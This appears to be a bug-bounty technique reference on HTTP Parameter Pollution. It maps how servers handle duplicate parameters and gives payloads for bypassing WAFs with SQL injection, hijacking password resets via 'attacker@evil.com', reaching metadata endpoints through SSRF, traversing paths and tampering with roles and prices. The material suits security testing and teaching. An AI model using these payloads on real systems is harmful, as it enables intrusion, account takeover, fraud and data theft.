---
id: "parameter-pollution"
title: "HTTP Parameter Pollution (HPP)"
type: "technique"
category: "web-application"
subcategory: "parameter-pollution"
tags: ["hpp", "parameter-pollution", "waf-bypass", "parser-differential", "injection", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["mass-assignment", "business-logic-flaws", "ssrf-techniques"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# HTTP Parameter Pollution (HPP)

## Why HPP Works
Different web servers, frameworks, and WAFs handle duplicate parameters differently. When a WAF sees one value but the app processes another, you bypass security controls. Simple but effective — often missed. Bounties: $2k–$10k.

## Server Behavior Map

```
# What happens when: ?id=1&id=2

# Server/Framework        | Result
# ----------------------- | --------
# PHP/Apache              | id = "2" (LAST)
# ASP.NET/IIS             | id = "1,2" (CONCATENATED)
# JSP/Tomcat              | id = "1" (FIRST)
# Python Flask/Django     | id = "1" (FIRST via request.args.get)
# Python (getlist)        | id = ["1", "2"] (ALL)
# Node.js Express         | id = "1" (FIRST via req.query.id)
# Node.js (qs parser)     | id = ["1", "2"] (ALL as array)
# Ruby on Rails           | id = "2" (LAST)
# Go net/http             | id = "1" (FIRST via r.URL.Query().Get)
# Nginx (proxy_pass)      | Forwards ALL parameters
```

## Attack Patterns

### 1. WAF Bypass via HPP
```
# WAF checks the FIRST value, app uses the LAST value (or vice versa)

# Example: SQL injection bypass
# WAF blocks: ?id=1 UNION SELECT
# But if WAF checks first param and app uses last:
?id=safe_value&id=1 UNION SELECT username,password FROM users--

# Or WAF checks last, app uses first:
?id=1 UNION SELECT username,password FROM users--&id=safe_value

# Test both orders to determine WAF/app behavior
```

### 2. Access Control Bypass
```
# Duplicate role or permission parameters:
POST /api/update-profile
user_id=123&role=user&role=admin

# If the app uses the last value: role=admin (escalation!)
# If concatenated (ASP.NET): role=user,admin (may grant admin)

# Account takeover via HPP:
POST /api/password-reset
email=victim@target.com&email=attacker@evil.com

# If app validates first email but sends reset to last:
# Reset link goes to attacker's email for victim's account
```

### 3. Payment/Logic Bypass
```
# Price manipulation:
POST /api/checkout
item_id=premium&price=9999&price=1

# Discount stacking:
POST /api/apply-coupon
code=SAVE10&code=SAVE50&code=SAVE90

# If app processes all codes: 150% off = free + credit

# Quantity manipulation:
POST /api/cart/add
product_id=1&quantity=1&quantity=-5

# Negative quantity in some systems = refund
```

### 4. SSRF Filter Bypass
```
# URL parameter pollution:
?url=https://safe.com&url=http://169.254.169.254/

# Path parameter pollution:
?path=/public/file.txt&path=../../../../etc/passwd

# If validation checks first, request uses last: filter bypassed
```

### 5. Parameter Delimiter Confusion
```
# Different parsers use different delimiters:

# Standard: & separator
?a=1&b=2

# Semicolon (accepted by some parsers):
?a=1;b=2

# HPP via delimiter confusion:
?id=1;id=2      # Parser A sees: id=1 | Parser B sees: id="1;id=2"
?id=1%26id=2    # URL-encoded & — some parsers decode, others don't

# Null byte:
?id=1%00&id=2   # Null byte may terminate first value for some parsers

# Array notation (framework-specific):
?id[]=1&id[]=2  # PHP/Node: id = ["1", "2"]
?id[0]=1&id[1]=2  # Some frameworks support indexed arrays
```

### 6. JSON vs Form Confusion
```
# Mix parameter formats to confuse parsers:

# Form data with JSON body:
POST /api/action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=view&data={"action":"delete","admin":true}

# Some frameworks merge form params and JSON body
# The JSON values may override form values

# Query string + body:
POST /api/action?role=user HTTP/1.1
Content-Type: application/json

{"role": "admin"}

# Which takes priority? Depends on framework
# Many apps trust the body over query string
```

### 7. Cookie Parameter Pollution
```
# Duplicate cookies:
Cookie: session=legit; session=attacker_session

# Or duplicate via multiple Cookie headers:
Cookie: session=legit
Cookie: session=attacker_session

# Server behavior varies:
# Apache: First cookie value
# Nginx: Last cookie value
# Some apps: Concatenated or random
```

### 8. Header Pollution
```
# Duplicate headers for bypass:
Host: target.com
Host: attacker.com

# X-Forwarded-For pollution:
X-Forwarded-For: trusted_ip
X-Forwarded-For: attacker_ip

# Content-Type confusion:
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded

# Some servers use first, some use last, some error out
```

## Testing Methodology
```
1. Identify all parameters in the request
2. Duplicate each parameter with a different value
3. Check which value the application uses (first, last, both, error)
4. Check which value the WAF inspects
5. If they differ: craft bypass payload
6. Test with different delimiters (& ; %00)
7. Test query string vs body parameter precedence
8. Test JSON vs form parameter merging
```

## Deep Dig Prompts
```
Given this endpoint [describe]:
1. Determine server/framework (response headers, error pages)
2. Map parameter handling behavior for duplicates
3. Test WAF vs app differential processing
4. Try delimiter confusion (semicolon, null byte, URL encoding)
5. Test query string vs body priority for same parameter
6. Chain HPP with other vulns (SQLi, SSRF, access control)
```

## Tools
- Burp Suite Repeater (manual parameter duplication)
- ParamMiner (Burp extension for parameter discovery)
- Arjun (parameter discovery)
- Custom curl scripts for systematic testing

## Common Chains
- HPP + SQLi = WAF bypass for injection
- HPP + IDOR = Access control bypass
- HPP + SSRF = URL filter bypass
- HPP + Payment = Price/discount manipulation
- HPP + Password Reset = Account takeover
